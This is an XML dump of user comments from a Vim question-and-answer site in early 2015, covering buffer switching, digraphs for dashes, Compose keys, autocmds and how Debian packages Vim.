  <row Id="1794" PostId="2181" Score="1" Text="@david That may be due to the fact that you have a rather large vimrc file with many plugins. If I try it, it seems to work. That's why I recommended the &quot;How to debug my vimrc&quot; link earlier :-) –" CreationDate="2015-02-24T19:59:51.847" UserId="51" />
  <row Id="1795" PostId="2181" Score="0" Text="Could you clarify what you mean by &quot;doesn't work&quot;? Do you mean that nothing happens when you press [Tab]?" CreationDate="2015-02-24T20:40:59.017" UserId="24" />
  <row Id="1798" PostId="2155" Score="1" Text="To avoid forgetting again, you could ask Vim to append `&amp;` every time: `:nnoremap :! :!&amp;&lt;Left&gt;` ... But of course, sometimes you won't want the `&amp;`, and will have to hit &lt;Del&gt;to remove it." CreationDate="2015-02-24T21:41:11.060" UserId="630" />
  <row Id="1799" PostId="2155" Score="0" Text="@joeytwiddle That's a good idea, and sounds like something you could write as an answer, instead of just a comment :-)" CreationDate="2015-02-24T21:43:01.793" UserId="51" />
  <row Id="1802" PostId="2135" Score="3" Text="@MattBoehm You're describing what you're seeing correctly.  I also interpreted the documentation as you did, so I submitted a [patch](http://article.gmane.org/gmane.editors.vim.devel/49581) to make Vim behave like it says it should." CreationDate="2015-02-24T21:54:52.537" UserId="15" />
  <row Id="1803" PostId="2093" Score="0" Text="Some general [Folding suggestions on the VimTips Wiki](http://vim.wikia.com/wiki/Folding). One simple thing I use on text files is [`:FoldBlocksLite`](https://github.com/joeytwiddle/rc_files/blob/master/.vim/plugin/foldblocks.vim) which creates a separate fold whenever there are two or more empty lines." CreationDate="2015-02-24T21:56:20.473" UserId="630" />
  <row Id="1804" PostId="2131" Score="1" Text="`:5b` is slightly shorter then `:b 5`  ;-)" CreationDate="2015-02-24T22:00:53.247" UserId="630" />
  <row Id="1805" PostId="2187" Score="1" Text="Truth be told, I don't actually use either of those, I use [my own little plugin](https://github.com/joeytwiddle/rc_files/blob/master/.vim/plugin/joeys_buffer_switcher.vim), but the functionality is very similar.  With the plugin, I can also perform Tab-complete on the filenames of un-opened buffers." CreationDate="2015-02-24T22:24:50.877" UserId="630" />
  <row Id="1806" PostId="2187" Score="1" Text="Although this technique isn't as fast as using `[count]&lt;C-^&gt;` when you know the buffer number, it is pretty useful when you don't know." CreationDate="2015-02-24T22:28:53.820" UserId="630" />
  <row Id="1807" PostId="760" Score="0" Text="@Carpetsmoker *&quot;`v^$&quot;ay` to yank (copy) this line to the `a` register.&quot;*  Shouldn't that `^` come before the `v`, and with `$` aren't you still copying the newline?  I think it should be: `0v$h&quot;ay` (yes painfully long!)" CreationDate="2015-02-24T22:39:19.173" UserId="630" />
  <row Id="1808" PostId="2120" Score="0" Text="Fantastic plugin!" CreationDate="2015-02-24T22:45:13.547" UserId="630" />
  <row Id="1815" PostId="2192" Score="1" Text="This is a very sensible solution, I like it." CreationDate="2015-02-25T03:23:18.063" UserId="64" />
  <row Id="1816" PostId="2190" Score="0" Text="Do the quotes inside of the execute strings need to be escaped?" CreationDate="2015-02-25T05:38:10.180" UserId="489" />
  <row Id="1823" PostId="2187" Score="1" Text="thanks joeytwiddle for your notes. I'll check your plugin asap. In my case (see keyboard issue above) `[count]&lt;C-6&gt;` appear to me the fastest way to switch to known buffer" CreationDate="2015-02-25T09:25:37.477" UserId="983" />
  <row Id="1824" PostId="258" Score="0" Text="I wonder if this problem should be handled by the OS, not by Vim. [This question](http://askubuntu.com/q/44534/232568) might be more appropriate." CreationDate="2015-02-25T10:49:34.553" UserId="64" />
  <row Id="1825" PostId="2194" Score="1" Text="You don't need python. Vim is more than enough: `:let buffers = filter(range(0, bufnr('$')), 'buflisted(v:val) &amp;&amp; ! getbufvar(v:val, &quot;&amp;modified&quot;)')` + `:exe 'bw '.join(buffers, ' ')`" CreationDate="2015-02-25T10:58:59.653" UserId="626" />
  <row Id="1826" PostId="2194" Score="0" Text="@LucHermitte True, but it's not a question of *need*. I'm just not familiar enough with Vimscript. IIRC `bw`'s help says you shouldn't use it &quot;unless you know what you're doing&quot;. I don't. :)" CreationDate="2015-02-25T11:06:13.487" UserId="205" />
  <row Id="1827" PostId="2190" Score="0" Text="Yes they do, forgot to include that." CreationDate="2015-02-25T11:40:50.517" UserId="865" />
  <row Id="1829" PostId="1919" Score="1" Text="The numbers.vim plugin recommended in [ediblemanager's answer](http://vi.stackexchange.com/a/1959/51) is like `relativenumber`, but better :-)" CreationDate="2015-02-25T12:54:35.230" UserId="51" />
  <row Id="1830" PostId="2185" Score="0" Text="Thank you. I find the problem at the space.vim plugin.I new a issue to author.https://github.com/spiiph/vim-space/issues/26" CreationDate="2015-02-25T13:02:32.150" UserId="1037" />
  <row Id="1831" PostId="2194" Score="0" Text="Old habits. I always use `:bw`, and never `:bd`. I've never seen the point of deleting almost everything from a buffer, but not actually everything." CreationDate="2015-02-25T14:13:42.797" UserId="626" />
  <row Id="1833" PostId="2199" Score="4" Text="FYI, U+2014 is an EM DASH.  U+2013 is an EN DASH.  http://www.fileformat.info/info/unicode/char/2014/index.htm,  http://www.fileformat.info/info/unicode/char/2013/index.htm" CreationDate="2015-02-25T14:39:04.103" UserId="93" />
  <row Id="1834" PostId="2199" Score="7" Text="If you're using X11, I would say XCompose ... As this will work on all your applications, and not just Vim. Or if you're on OSX or Windows, the facilities that that OS provide." CreationDate="2015-02-25T14:40:35.467" UserId="51" />
  <row Id="1835" PostId="2201" Score="0" Text="Likewise, an EM DASH can be inserted with &lt;C-k&gt;-M." CreationDate="2015-02-25T14:40:59.250" UserId="93" />
  <row Id="1839" PostId="2201" Score="0" Text="`U+2014` is not en-dash? my whole life was a lie! Edit: now I get it: my terminal font (Inconsolata) renders both dashes the same way." CreationDate="2015-02-25T15:11:05.363" UserId="1056" />
  <row Id="1847" PostId="2205" Score="0" Text="Actually, `nested` is a part of the autocmd, not a modifier for an ex command.  The autocmd needs to change to `autocmd BufNewFile * nested call LookupFiles() | e`" CreationDate="2015-02-25T15:47:39.880" UserId="15" />
  <row Id="1849" PostId="2205" Score="0" Text="@jamessan That's what I understood of the help text and used. I accepted assuming this usage also works." CreationDate="2015-02-25T15:59:32.890" UserId="205" />
  <row Id="1851" PostId="2211" Score="0" Text="Simply changing my answer to use `*` for the file pattern, rather than specific files, should achieve the same thing and avoids your problem with `:tabe`." CreationDate="2015-02-25T16:13:52.073" UserId="15" />
  <row Id="1852" PostId="1952" Score="0" Text="This is the only answer here that actually answers the question: *&quot; execute a command in the background that only notifies me on a non-zero exit code&quot;* ... I have no idea why the other answers even have upvotes at all..." CreationDate="2015-02-25T16:19:24.683" UserId="51" />
  <row Id="1853" PostId="1958" Score="0" Text="How do you get notified on a non-zero exit code?" CreationDate="2015-02-25T16:26:06.990" UserId="51" />
  <row Id="1855" PostId="1979" Score="0" Text="This isn't really running it in the background; you still need to wait for it to finish." CreationDate="2015-02-25T16:26:59.377" UserId="51" />
  <row Id="1856" PostId="2211" Score="0" Text="@jamessan I admit I saw the original autocmd and zoned out. On an unrelated note: the fnameescape might be the solution to another question here, about gvim and remote send." CreationDate="2015-02-25T16:28:50.170" UserId="205" />
  <row Id="1857" PostId="2203" Score="0" Text="+1; it should be possible to open a gazillion buffers in Vim at the same time and still be good. As long as you're not viewing the buffer (in a window, or &quot;tab&quot;) it's not loaded in memory." CreationDate="2015-02-25T16:30:15.723" UserId="51" />
  <row Id="1858" PostId="2170" Score="0" Text="If you're using Vim-LaTeX/LaTeX-Squite, press F5." CreationDate="2015-02-25T16:32:57.023" UserId="142" />
  <row Id="1859" PostId="2203" Score="0" Text="@Carpetsmoker, buffer variables and settings do not disappear when the buffer is not displayed in a window. If a plugin stores a lot of information for each buffer, as Peter suggested, then memory could be wasted (considering the end-user won't do anything more with the buffer). BTW: A plugin may not store data related to buffers in `b:variables` but in a `s:plugin[bufid]` if the plugin maintainer preferred to not pollute the public `b:` _&quot;namespace&quot;_. In this case, deleting the buffer won't necessarily collect all related variables/memory." CreationDate="2015-02-25T16:41:10.370" UserId="626" />
  <row Id="1860" PostId="2205" Score="0" Text="whoops, I'll revise my comment. Should have read the docs more closely." CreationDate="2015-02-25T16:50:52.550" UserId="680" />
  <row Id="1861" PostId="1940" Score="0" Text="I would not recommend using a separate vimrc file, for the simple reason that it's so easy to forget. Something like this autocmd: `au BufRead * if &amp;l:cm != &quot;&quot; | setlocal nobackup noundofile ... | endif` should do the magic for you, and it's impossible to forget." CreationDate="2015-02-25T16:52:45.087" UserId="51" />
  <row Id="1862" PostId="2192" Score="1" Text="Note that if this new buffer is meant to be temporary, you may want to make it a scratch buffer by doing `setlocal buftype=nofile bufhidden=hide noswapfile`. Among other things, this lets you quit vim without saving/deleting that buffer. If you do this regularly, I'd suggest making a keyboard shortcut or getting one of the &quot;scratch&quot; plugins." CreationDate="2015-02-25T17:24:03.810" UserId="680" />
  <row Id="1863" PostId="2210" Score="0" Text="Thanks for this answer. I accepted it instead of the initial answer given by @Rich because it seemed more complete. I will try it out but not sure if I will be using it because of all the side effects so no promise here :) Big Thank You for all the effort!" CreationDate="2015-02-25T17:43:27.823" UserId="307" />
  <row Id="1864" PostId="2210" Score="1" Text="@KarolisKoncevičius Thanks. I added it to my vimrc aswell. It seems nice :-) Let me know if you encounter problems." CreationDate="2015-02-25T18:00:38.147" UserId="51" />
  <row Id="1865" PostId="2201" Score="1" Text="To arrive at this answer: hex 2013 is decimal 8211. Use the [`:digraphs`](https://vimhelp.appspot.com/digraph.txt.html) command to display all digraphs, and look for 8211." CreationDate="2015-02-25T18:04:33.367" UserId="24" />
  <row Id="1866" PostId="2199" Score="0" Text="Perhaps not the *easiest* way, but I tend to use `&lt;Ctrl-Shift-U&gt;2013&lt;Space&gt;` because it works everywhere. A few key codes go a long way (I mainly use U+2013, U+2014, U+2026, U+2212, U+2192, U+B0; –/—/…/−/→/°)." CreationDate="2015-02-25T18:08:53.583" UserId="142" />
  <row Id="1867" PostId="2199" Score="0" Text="Out of curiosity, how do you *display* en dashes? AFAIK, there is no way to display non-fixed-width fonts properly (i.e. with non-uniform character widths and kerning), so em- and en-dashes always look exactly like hyphens that extend to the extreme edge of the character boundary. Do you just not mind having an extreme disconnect between how the character is displayed in Vim and how it's rendered elsewhere?" CreationDate="2015-02-25T18:45:15.690" UserId="1060" />
  <row Id="1868" PostId="2199" Score="0" Text="For future reference, `:h digraph-table` will bring you to something a little more useful than `:digraphs`. In particular, `:h digraph-table` followed by `/dash` (assuming you're using smartcase) or `/\cdash` (if you're not) will bring you right to em- and en- dashes." CreationDate="2015-02-25T18:51:11.367" UserId="1062" />
  <row Id="1869" PostId="2220" Score="0" Text="Note: `plugin-gundo` would be a good tag for this question, but unfortunately that tag doesn't exist yet, and I have no rep." CreationDate="2015-02-25T19:22:00.280" UserId="1060" />
  <row Id="1870" PostId="2086" Score="0" Text="Would you mind expanding a bit on what you mean by &quot;support excluding...&quot;? Do you mean that you'd like to show a list of all files except some matching a pattern, or that you'd like to exclude certain files from *ever* showing up in the list? (The latter option is what @muru's answer with `autocmd` does; the former seems like it would be more useful and possibly easier to achieve.)" CreationDate="2015-02-25T19:29:44.677" UserId="1060" />
  <row Id="1871" PostId="2087" Score="0" Text="That's an awesome feature that I'd never heard of." CreationDate="2015-02-25T19:30:01.040" UserId="1060" />
  <row Id="1872" PostId="2219" Score="0" Text="What is the value of `c_no_cformat`?" CreationDate="2015-02-25T19:39:10.363" UserId="72" />
  <row Id="1873" PostId="2204" Score="1" Text="`Alt+-` (or rather `Option+-` to be pedantic) is a Mac-specific shortcut. It works everywhere in OS X, but is not related to vi or vim." CreationDate="2015-02-25T19:52:46.750" UserId="1064" />
  <row Id="1874" PostId="2221" Score="0" Text="I tried `:let c_no_cformat = 0`; is that what you meant by setting it to false? It apparently had no effect." CreationDate="2015-02-25T19:55:50.510" UserId="1060" />
  <row Id="1875" PostId="2219" Score="0" Text="@JoshPetrie It's undefined when I launch with `-u -NONE` and then turn on syntax." CreationDate="2015-02-25T19:56:47.003" UserId="1060" />
  <row Id="1876" PostId="2220" Score="1" Text="There's also [undotree](https://github.com/mbbill/undotree). I don't know how exactly it's different from gundo, or if it supports the feature you want, but you could check it out." CreationDate="2015-02-25T20:00:12.687" UserId="51" />
  <row Id="1877" PostId="2221" Score="0" Text="No, use unlet (per the docs, see :help ft-c-syntax) and then reload the file." CreationDate="2015-02-25T20:01:36.890" UserId="72" />
  <row Id="1878" PostId="2221" Score="0" Text="I get &quot;no such variable&quot; (consistent with my previous comment that it's undefined)." CreationDate="2015-02-25T20:04:26.610" UserId="1060" />
  <row Id="1879" PostId="2221" Score="0" Text="Well, that's obnoxious. I can definitely reproduce your behavior and then fix it that way, and it's consistent with the vim_dev thread I linked. It's possible your runtime files differ from mine (I'm on Windows, using gVim) in such a way as to also affect the way the syntax file evaluates." CreationDate="2015-02-25T20:08:23.553" UserId="72" />
  <row Id="1880" PostId="2221" Score="0" Text="There are certainly some compilation differences across platforms at work; note that in the answer on my original SuperUser question, IngoKarkat was unable to reproduce the issue." CreationDate="2015-02-25T20:11:09.223" UserId="1060" />
  <row Id="1881" PostId="2221" Score="0" Text="If you drop in to the [chat] we may be able to work out what the difference is. My guess is you have the patch that &quot;broke&quot; this as pointed out on vim_dev, and I don't." CreationDate="2015-02-25T20:30:05.013" UserId="72" />
  <row Id="1882" PostId="2221" Score="0" Text="Let us [continue this discussion in chat](http://chat.stackexchange.com/rooms/21448/discussion-between-kyle-strand-and-josh-petrie)." CreationDate="2015-02-25T20:48:38.540" UserId="1060" />
  <row Id="1883" PostId="2223" Score="0" Text="I get the same error on my Linux system, so it doesn't seem to be Windows-specific behaviour" CreationDate="2015-02-25T21:14:41.440" UserId="51" />
  <row Id="1885" PostId="2224" Score="0" Text="That does the trick. Too bad I can't +2 for linking to the documentation question." CreationDate="2015-02-25T21:27:38.023" UserId="475" />
  <row Id="1886" PostId="2224" Score="0" Text="@Roflo I can't take any credit for that post, that's all *romainl*'s work :-)" CreationDate="2015-02-25T21:30:57.237" UserId="51" />
  <row Id="1887" PostId="2210" Score="0" Text="Hahaha. Well I think this qualifies as hacky, but it's not as horrible as I expected. Nice job. Of, course, now that you've gone this far, don't you feel compelled to fix the problems with j, k, $, etc. by remapping them, and to remove the white space before yanking? ;)" CreationDate="2015-02-25T21:32:46.673" UserId="343" />
  <row Id="1888" PostId="2210" Score="2" Text="@Rich Yeah, it's a hack. That made it fun to do ;-) Fixing some of the keys (somehow) crossed my mind as well, but I already spent quite a bit of time on this, and want to first see if it actually works at all, and if I even like it, before spending even more time on it :-)" CreationDate="2015-02-25T21:34:57.440" UserId="51" />
  <row Id="1889" PostId="2202" Score="0" Text="The en dash digraph is built in." CreationDate="2015-02-25T21:39:38.423" UserId="24" />
  <row Id="1890" PostId="2227" Score="0" Text="Is it also possible to disable just the `autocmd`/`augroup` as defined by the zip plugin? I like this (+1), but if you for example have an `autocmd` to disable syntax highlight and such for large files (as is common), then you will *also* disable that as a side-effect..." CreationDate="2015-02-25T21:43:52.093" UserId="51" />
  <row Id="1891" PostId="2227" Score="0" Text="@Carpetsmoker Not temporarily.  If you know the group name (in this case &quot;zip&quot;), you can undefine all of the autocmds defined in that group with `augroup zip | exe 'au!' | augroup END`." CreationDate="2015-02-25T21:47:56.560" UserId="15" />
  <row Id="1892" PostId="2202" Score="0" Text="@200_success I didn't say it wasn't. :) Vim's digraph choices don't always align with more standard ones, so knowing how to define your own digraph is useful, even if one already exists." CreationDate="2015-02-25T21:49:29.727" UserId="15" />
  <row Id="1893" PostId="2204" Score="0" Text="Works in MacVim, but in Terminal vim it acts like [Esc] followed by `-`, thus switching to Normal mode and putting the cursor at the beginning of the previous line." CreationDate="2015-02-25T21:51:28.663" UserId="24" />
  <row Id="1894" PostId="2228" Score="0" Text="Is there some automated way of distributing the regex like that? It provides such a clear depiction." CreationDate="2015-02-25T22:14:36.047" UserId="205" />
  <row Id="1895" PostId="2228" Score="1" Text="I've been doing it by hand. The easiest quick way in vim would be to do something like `yy10p` on the line with the full regex then select parts you wish to remove and hit `r&lt;space&gt;`. Maybe I'll add a command for 'replace everything except the selection on this line with spaces' to speed things up a bit." CreationDate="2015-02-25T22:21:01.600" UserId="680" />
  <row Id="1896" PostId="2228" Score="0" Text="Wow! That is quite some effort!" CreationDate="2015-02-25T22:21:34.887" UserId="205" />
  <row Id="1897" PostId="2223" Score="1" Text="Just out of curiosity, why are you doing your checksums/hex from within vim?" CreationDate="2015-02-25T22:22:20.757" UserId="880" />
  <row Id="1898" PostId="2230" Score="1" Text="This seems very opinion-based ... You're not really asking anything, except &quot;which of these 3 solutions is considered the best&quot; (since the last 2 are considered too &quot;long&quot; or &quot;lame&quot;)..." CreationDate="2015-02-25T22:32:44.137" UserId="51" />
  <row Id="1899" PostId="2230" Score="0" Text="My point really is: is there a best practice (or a plugin) for precise vertical movement? Horizontal movement is pretty easy: `f`, `t`" CreationDate="2015-02-25T22:46:54.837" UserId="1056" />
  <row Id="1900" PostId="2230" Score="3" Text="&quot;So, what do you guys use?&quot; is more of a poll than a real question." CreationDate="2015-02-25T22:48:12.110" UserId="88" />
  <row Id="1901" PostId="2231" Score="0" Text="&quot;This means the Vim packaging can't specify a hard dependency on a minimum version of a library.&quot; I assume that's why Debian doesn't have separate packages for Vim+Python2 and Vim+Python3 the way Arch Linux has?" CreationDate="2015-02-25T22:49:06.880" UserId="205" />
  <row Id="1904" PostId="2234" Score="0" Text="It's an independent program that is run from the command line, and it's installed independently from vim (I've seen it in several Linux distributions that didn't install vim by default). That's a UNIX command tool for me :-P" CreationDate="2015-02-25T23:53:34.133" UserId="403" />
  <row Id="1906" PostId="2234" Score="0" Text="Rephrased it to &quot;command line tool&quot; ;-)" CreationDate="2015-02-26T00:04:48.350" UserId="403" />
  <row Id="1907" PostId="2222" Score="0" Text="Similar post: [Folding by regex search pattern](http://vi.stackexchange.com/q/2165/778)" CreationDate="2015-02-26T00:13:26.927" UserId="778" />
  <row Id="1908" PostId="2230" Score="1" Text="What do you mean by &quot;precise vertical movement&quot;? You're describing moving to a different column as well as a different row; that's not precisely &quot;vertical.&quot; It sounds like you're just asking &quot;how do I perform an arbitrary movement in Vim&quot; without noticing that (to give an off-the-cuff estimate) 90% of Vim keystrokes are movement-related." CreationDate="2015-02-26T00:21:12.507" UserId="1060" />
  <row Id="1909" PostId="2238" Score="0" Text="Why two `&lt;esc&gt;`s? You only need one." CreationDate="2015-02-26T00:51:47.823" UserId="88" />
  <row Id="1910" PostId="2238" Score="0" Text="Oops, I was just getting mixed up because of the delay for vim to respond.  I'll edit the question." CreationDate="2015-02-26T00:56:14.787" UserId="141" />
  <row Id="1911" PostId="2238" Score="1" Text="I can only suggest `)gE`. I know you said you always end sentences with a period, but it's better to not even have to assume that." CreationDate="2015-02-26T01:35:52.873" UserId="195" />
  <row Id="1912" PostId="2238" Score="0" Text="Also note that `as` and `is` do not only work in visual mode. You can do `das` in normal mode to Delete A Sentence." CreationDate="2015-02-26T01:39:36.923" UserId="195" />
  <row Id="1913" PostId="2231" Score="0" Text="@muru Python is only one of the language bindings available.  Providing combinations of packages for the different languages and GUI toolkits is a large number of packages.  The decision was to enable as many language bindings as was reasonable and let the choice be among GUI toolkits (or not).  A user shouldn't have to choose Vim plugins based on the language they're written in." CreationDate="2015-02-26T02:23:55.203" UserId="15" />
  <row Id="1914" PostId="2231" Score="0" Text="That is not a real argument, since only Python and Python3 conflict each other. I honestly think you should borrow a leaf from the Arch developers' book. Aside from a common `vim-runtime` package, they have `vim`, `gvim`, `vim-python3` and `gvim-python3`. The only difference between the `-python3` and the normal packages is the version of Python enabled. Sure, it doubles the number of frontend packages, but that's all the flaw I see in such packaging." CreationDate="2015-02-26T02:55:55.050" UserId="205" />
  <row Id="1915" PostId="2231" Score="0" Text="That's for Arch.  In Debian, there's `vim-nox`, `vim-gtk`, `vim-gnome`, and `vim-athena`.  Doubling those just so that users still can't use both Python and Python3 plugins doesn't seem worthwhile." CreationDate="2015-02-26T03:07:27.343" UserId="15" />
  <row Id="1916" PostId="2231" Score="0" Text="I'd like to discuss that further, but the comments section is not the place for it. Do you visit `:chat!`?" CreationDate="2015-02-26T03:15:56.337" UserId="205" />
  <row Id="1917" PostId="801" Score="0" Text="Sort of a dupe, but the other qu. is more about *nix than Windows" CreationDate="2015-02-26T03:24:52.540" UserId="398" />
  <row Id="1919" PostId="2199" Score="0" Text="@WChargin it works only in GTK applications, which is far from everywhere." CreationDate="2015-02-26T04:33:19.717" UserId="1081" />
  <row Id="1920" PostId="2199" Score="0" Text="@Ruslan True, but it's everywhere for me! `:D` I've heard that it's bad practice to mix GTK and KDE anyway. It's Not Perfect, But It Works.™" CreationDate="2015-02-26T05:39:06.533" UserId="142" />
  <row Id="1921" PostId="2199" Score="0" Text="@WChargin it's a normal practice. You don't have to be devoted to a particular toolkit — just use the apps which work." CreationDate="2015-02-26T06:04:07.937" UserId="1081" />
  <row Id="1922" PostId="2236" Score="0" Text="This is the answer I was hoping for. Thank you!" CreationDate="2015-02-26T06:45:08.417" UserId="1056" />
  <row Id="1923" PostId="2086" Score="0" Text="@KyleStrand I was thinking of the first variant, excluding a file if the path matches one of a list of patterns. For example, the patterns could be something like `*.tmp,/tmp/*,/mnt/foo/*`." CreationDate="2015-02-26T07:26:28.927" UserId="925" />
  <row Id="1924" PostId="429" Score="3" Text="Someone would have to be *really* crazy to write a script like that." CreationDate="2015-02-26T08:04:49.033" UserId="630" />
  <row Id="1925" PostId="2210" Score="1" Text="@Carpetsmoker Well the last time I vaguely hinted that something might be possible you went away and made it, so I look forward to seeing your robust multi-language solution in another couple of weeks." CreationDate="2015-02-26T08:14:48.480" UserId="343" />
  <row Id="1926" PostId="2199" Score="2" Text="I am with @Carpetsmoker: `Compose` `-` `-` `-` for a em-dash, `Compose` `-` `-` `.` for a en-dash. Compose is magical, especially if you map it to the otherwise totally unused Caps-Lock." CreationDate="2015-02-26T09:24:38.740" UserId="854" />
  <row Id="1927" PostId="2243" Score="0" Text="This probably explains why I wasn't able to reproduce the issue." CreationDate="2015-02-26T10:08:01.650" UserId="51" />
  <row Id="1928" PostId="2221" Score="1" Text="`cCppOut2 comes from c.vim (oddly enough):`. Seems legit to have this in C provided that &quot;Cpp&quot; stands for `C PreProcessor` in this context." CreationDate="2015-02-26T10:24:22.730" UserId="860" />
  <row Id="1929" PostId="476" Score="0" Text="Rather than using `tee` then throwing away its output, wouldn't `cat` also work if you don't want the file printed out?" CreationDate="2015-02-26T11:08:25.233" UserId="632" />
  <row Id="1930" PostId="2206" Score="0" Text="Hmm. `keepalt file` has the same drawback as assigning to `vim.current.buffer.name` - vim warns you that the file already exists when try to save your changes." CreationDate="2015-02-26T11:29:57.823" UserId="205" />
  <row Id="1931" PostId="2244" Score="1" Text="I think you use `v&lt;Esc&gt;d50j`?" CreationDate="2015-02-26T11:59:42.213" UserId="51" />
  <row Id="1933" PostId="2245" Score="0" Text="This is [cross-posted from stackoverflow](http://stackoverflow.com/q/26115471/4063051). The only reason I don't delete the post there is to have it more easily foundable via google search." CreationDate="2015-02-26T13:09:20.827" UserId="602" />
  <row Id="1935" PostId="2223" Score="0" Text="@Random832 on this occasion, just because it's the first thing that came to my mind. Most other times, because I can checksum a [range](http://vim.wikia.com/wiki/Ranges) instead of the whole file, and hex because I can switch back and forth with raw." CreationDate="2015-02-26T14:52:24.823" UserId="475" />
  <row Id="1936" PostId="2243" Score="2" Text="Unfortunately, the version of Vim that's in Debian's wheezy-backports (and will be in jessie) doesn't have the fix for this.  I'll upload a fixed version to jessie-backports once jessie is released, but not much else that can be done." CreationDate="2015-02-26T15:23:33.703" UserId="15" />
  <row Id="1937" PostId="2239" Score="1" Text="This has driven me nuts for years!" CreationDate="2015-02-26T15:43:22.590" UserId="989" />
  <row Id="1938" PostId="2241" Score="2" Text="Sorry, I should've been more clear. This has nothing to do with insert mode. I use hard tabs and each hard tab takes up four spaces. When I move the cursor (normal mode) onto a hard tab character it ends up on the right-most column of the tab. I want it to be at the left-most column of the tab. This is purely a aesthetic issue." CreationDate="2015-02-26T15:53:41.880" UserId="200" />
  <row Id="1939" PostId="2242" Score="1" Text="Thank you! You helped me look in the right place. `:set list listchars=tab:\ \ ` results in what I asked for. Now I just need to see if it's as useful as I thought!" CreationDate="2015-02-26T15:59:34.170" UserId="200" />
  <row Id="1940" PostId="2244" Score="0" Text="Thanks, I had indeed written it incorrectly.  Actually I start with `V` if I know I will be doing a line-wise operation, and then I can leave the `d` until last, for greater confidence." CreationDate="2015-02-26T16:18:56.403" UserId="630" />
  <row Id="1942" PostId="2247" Score="0" Text="&lt;C-^&gt; alone (&lt;C-6&gt; in my case, as  Peter Rincker suggested) is a good trick in case of just 2 buffers :-)" CreationDate="2015-02-26T16:50:12.883" UserId="983" />
  <row Id="1945" PostId="2087" Score="0" Text="Might it be possible to combine the `browse` command with [`unite`](https://github.com/Shougo/unite.vim) and/or [`PipeCmd`](https://github.com/joeytwiddle/rc_files/blob/c8264794527c6be685829f08f63fd8dfa2903528/.vim/plugin/joeycommands.vim#L112-131) to achieve the filtering that OP would like?" CreationDate="2015-02-26T18:33:43.020" UserId="1060" />
  <row Id="1946" PostId="2087" Score="0" Text="@KyleStrand I have never used either, so I don't know." CreationDate="2015-02-26T18:37:35.033" UserId="205" />
  <row Id="1947" PostId="2228" Score="1" Text="I made a (really ugly) vim function to make this a bit faster: https://gist.github.com/mattboehm/da63a48eedf6f14375aa . Select a line, hit `,r` then join lines together with `&lt;space&gt;` in normal/visual mode." CreationDate="2015-02-26T18:42:04.273" UserId="680" />
  <row Id="1948" PostId="2250" Score="1" Text="Hm. Since doing a search-and-replace can make the word(s) being replaced completely invisible to `changes`, that's not terribly useful. What I'd really like is to be able to do `:%s/foo/bar/g`, then do a search for `foo` that would (reconstruct and) show me the last version of the file in which `foo` was present." CreationDate="2015-02-26T18:42:27.627" UserId="1060" />
  <row Id="1949" PostId="2243" Score="0" Text="Yes, this would be appreciated. Also for bug [774492](https://bugs.debian.org/774492) which I understand can be very disturbing for people." CreationDate="2015-02-26T19:57:14.110" UserId="71" />
  <row Id="1950" PostId="2245" Score="0" Text="Have you tried using `:inoreab`?!" CreationDate="2015-02-26T20:13:55.130" UserId="970" />
  <row Id="1951" PostId="1979" Score="0" Text="@Carpetsmoker: Yes, thus my comment *“… does not handle background processes as in `foo &amp;` …”*. From the Q text as a whole I interpreted it as being either or. Either *“Execute as external command AKA background”* or *“Execute as external command _and_ as background process.”*. I answered mainly based on the title of Q etc. – and added a comment on *“Not sure …”* – and left it to OP to clarify if either or." CreationDate="2015-02-26T20:30:37.493" UserId="220" />
  <row Id="1952" PostId="2249" Score="1" Text="Vim doesn't have autocomplete.  Are you using a plugin or are you referring to one of the [ins-completion](http://vimhelp.appspot.com/insert.txt.html#ins-completion) commands?" CreationDate="2015-02-26T20:42:29.177" UserId="15" />
  <row Id="1953" PostId="2229" Score="0" Text="I gave this answer the tick because to me its how to do the highlighting that I needed (as expressed by the question). @Matts regular expression nice but does not answer the actual question I asked (changing the highlighting)." CreationDate="2015-02-26T21:44:51.140" UserId="383" />
  <row Id="1955" PostId="2254" Score="0" Text="The other question is really a &quot;special case&quot; of this more generic question; the answers will be the same... My comment there also applies: Use you OS' facilities (whatever they may be), or some other OS-wide program (for examplle when I used Windows, I liked to use AllChars which emulates X11's Compose key; it works in all programs)." CreationDate="2015-02-26T21:55:09.293" UserId="51" />
  <row Id="1956" PostId="2254" Score="0" Text="Yes that is a special case and the answers are specialized for it. Do you not think there may be a more generalized solution that encompases more things that people did not consider when looking at the special case." CreationDate="2015-02-26T21:57:18.160" UserId="383" />
  <row Id="1957" PostId="2254" Score="0" Text="We could also make that question more generic, or mark that one a dupe of this one (even though it was earlier); I don't really care *as such*. But I don't think that having both questions as it is will help anyone in the long term :-)" CreationDate="2015-02-26T21:59:05.543" UserId="51" />
  <row Id="1958" PostId="2254" Score="0" Text="If I could control the world. Maybe we should let it stand for a day or two so if it gathered any unique responses that could distinguish it from the other question. If it remains unanswered or the answers are just duplicates then close/delete it." CreationDate="2015-02-26T22:09:30.963" UserId="383" />
  <row Id="1960" PostId="2254" Score="0" Text="All right .. I definitely agree the other question doesn't have *great* answers, and this question should attract better ones (hopefully) ... Editing the other question (to make it more generic) still leaves it with a bunch of highly upvoted answers that deal *only* with the em dash, so that's not great either ... So I've retracted my close vote, and as soon as this gets some decent answers I'll vote the other oone a dupe of this one (even though it was earlier)... I of course can't control what other people choose to vote." CreationDate="2015-02-26T22:17:32.663" UserId="51" />
  <row Id="1961" PostId="2254" Score="0" Text="@Carpetsmoker: If we had a mod then they have the power to combine questions I believe which is another options. We could as a group potentially edit the questions together if that made sense in the long run." CreationDate="2015-02-26T22:33:31.823" UserId="383" />
  <row Id="1962" PostId="2256" Score="1" Text="For Windows, use [Wincompose](https://github.com/samhocevar/wincompose) instead of Allchars. It does exactly what it says on the tin. I used Allchars until I found Wincompose. The limitation of compose is that you can't have a memorable combination to reach all characters, only the ones that you use often or that have a logical decomposition." CreationDate="2015-02-27T00:28:34.067" UserId="8" />
  <row Id="1963" PostId="2256" Score="0" Text="@Gilles Thanks; WinCompose looks nice. You're right that you can only enter a fairly limited subset of &quot;most used&quot; characters. For me this is enough &gt;95% of the time. For the rest I use [UniView](http://rishida.net/uniview/)... I'm not aware of anything significantly better..." CreationDate="2015-02-27T00:38:08.620" UserId="51" />
  <row Id="1964" PostId="2199" Score="0" Text="possible duplicate of [What is the easiest way to insert unicode characters into a document?](http://vi.stackexchange.com/questions/2254/what-is-the-easiest-way-to-insert-unicode-characters-into-a-document)" CreationDate="2015-02-27T00:38:51.963" UserId="51" />
